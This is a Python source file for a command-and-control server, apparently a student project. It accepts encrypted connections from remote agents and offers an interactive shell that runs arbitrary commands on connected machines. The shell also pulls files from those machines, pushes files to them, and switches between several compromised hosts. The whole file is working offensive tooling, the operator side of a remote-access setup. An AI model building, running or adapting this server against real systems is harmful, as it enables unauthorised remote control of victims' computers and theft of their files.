from cryptography.fernet import Fernet
from termcolor import colored
import prettytable
import threading
import pyfiglet
import socket
import signal
import time
import sys
import rsa
import os

def accept_connection():
    while True:
        connection, address = server.accept()
        print(f"\rI got connection from {address[0]}\nCommand2Control >", end='')
        remote_public = rsa.PublicKey.load_pkcs1(connection.recv(4096))
        key = Fernet.generate_key()
        connection.send(rsa.encrypt(key, remote_public))
        client_sockets.append([connection, address, key])

def encrypt(data, key):
    f = Fernet(key)
    token = f.encrypt(data)
    return token

def decrypt(cipher, key):
    f = Fernet(key)
    raw = f.decrypt(cipher)
    return raw

def handle_client(client_socket, address, key):
    try:
        os_type = decrypt(client_socket.recv(4096), key).decode()
        print(colored('Connection received from: ' + address[0], 'cyan'))
        print(colored(pyfiglet.figlet_format(os_type), 'red'))

        while True:
            command = input(colored('Shell> ', 'blue')).strip()

            if command == 'exit':
                print(colored("Connection stopped forcibly by server..", 'red'))
                client_socket.close()
                break

            if command.startswith('getfile'):
                _, file_name = command.split(' ', 1)
                client_socket.send(encrypt(command.encode(), key))
                receive_file(client_socket, file_name, key)
                continue

            if command.startswith('sendfile'):
                _, file_path = command.split(' ', 1)
                client_socket.send(encrypt(command.encode(), key))
                send_file(client_socket, file_path, key)
                continue

            if command == 'switch':
                client_socket.send(encrypt(b"stop", key))
                switch_client()
                continue

            if command == 'clear':
                clear_screen()
                continue

            if command == 'list':
                list_files()
                continue

            if command == 'help' or command == '?':
                print_help()
                continue
                
            if not command:
                continue
                
            client_socket.send(encrypt(command.encode(), key))
            response = decrypt(client_socket.recv(8192), key).decode()
            if response == "\n\r":
                continue
            print(colored(response, 'yellow'))

    except Exception as e:
        print(f"Error handling client: {e.with_traceback()}")
        client_socket.close()

def send_file(client_socket, file_path, key):
    try:
        with open(file_path, 'rb') as file:
            data = file.read(4096)
            while data:
                client_socket.send(encrypt(data, key))
                data = file.read(4096)
            time.sleep(0.3)
            client_socket.send(encrypt(b"\n\r", key))
        print(f"File '{file_path}' sent successfully.")
    except Exception as e:
        print(f"Error while sending '{file_path}':\n{e}")

def receive_file(client_socket, file_name, key):
    try:
        with open(f"C:\\Users\\Student\\Desktop\\C2 Python Project\\{time.time_ns()}", 'ab') as file:
            a = decrypt(client_socket.recv(4096), key)
            while a != b"\n\r":
                file.write(a)
                a = decrypt(client_socket.recv(4096), key)


        print(f"File '{file_name}' downloaded successfully.")
    except Exception as e:
        print(f"Error while receiving '{file_name}'\n\n{e}")

def switch_client():
    print(colored("\nConnected Clients:", 'cyan'))
    table = prettytable.PrettyTable(["Index", "Address"])
    for idx, (_, address, key) in enumerate(client_sockets):
        table.add_row([idx, address[0]])
    print(table)
    
    client_idx = input(colored("\nEnter the index of the client you want to switch to: ", 'blue')).strip()
    try:
        client_idx = int(client_idx)
        client_socket, address, key = client_sockets[client_idx]
        print(colored(f"\nSwitching to client {address[0]}\n", 'green'))
        handle_client(client_socket, address, key)
    except (ValueError, IndexError):
        print(colored("Invalid index!", 'red'))

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def list_files():
    files = os.listdir()
    print(colored("\nFiles in Server Directory:", 'cyan'))
    for file in files:
        print(file)
    print()


def print_help():
    print(colored(pyfiglet.figlet_format('HELP'), 'blue'))
    print(colored("Available commands:", 'cyan'))
    print("switch   - Switch between connected clients")
    print("exit     - Close the server")
    print("clear    - Clear the screen")
    print("list     - List files in the server directory")
    print("help, ?  - Show this help menu")

def signal_handler(sig, frame):
    print('\nConnection closed by server...')
    for client_socket in client_sockets:
        client_socket.close()
    server.close()
    sys.exit()

signal.signal(signal.SIGINT, signal_handler)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('192.168.30.125', 5555))
server.listen(5)

threading.Thread(target=accept_connection).start()

print(colored(pyfiglet.figlet_format('SERVER'), 'green'))
print("Welcome to my server!")

commands = ["switch", "exit", "clear", "list", "help", "?"]

client_sockets = []

while True:
    try:
        command = input("Command2Control > ").strip()
        while command not in commands:
            print("Wrong command entered\ntype (help/?) for further information")
            command = input("Command2Control > ").strip()

        if command == 'exit':
            signal_handler(None, None)
        elif command == 'help' or command == '?':
            print_help()
        elif command == 'switch':
            switch_client()
        elif command == 'clear':
            clear_screen()
        elif command == 'list':
            list_files()

    except socket.timeout:
        server.close()
        sys.exit()

    except ConnectionAbortedError:
        print(colored("Connection aborted by error", 'red'))
        sys.exit()
